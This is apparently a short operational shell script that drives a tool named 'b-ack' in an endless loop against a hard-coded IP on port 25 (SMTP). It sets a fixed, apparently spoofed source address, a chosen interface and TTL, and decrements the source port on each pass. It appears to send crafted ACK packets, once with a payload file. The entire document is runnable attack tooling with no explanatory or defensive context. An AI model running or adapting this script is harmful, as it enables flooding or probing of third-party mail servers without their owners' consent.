#!/bin/sh
dip=202.108.37.41
sprt=10000
dprt=25
ttl=28
./b-ack -s 169.154.136.43 -o $sprt -d $dip -p $dprt -i eth3 -t $ttl -E yhkw.txt -A

while [ 2 -lt 10 ]
do
sprt=`expr $sprt - 1`
#dprt=`expr $dprt + 1`
#echo "Using dst port $dprt ..."
echo "Using src port $sprt ..."
./b-ack -s 169.154.136.43 -o $sprt -d $dip -p $dprt -i eth3 -t $ttl -A
done


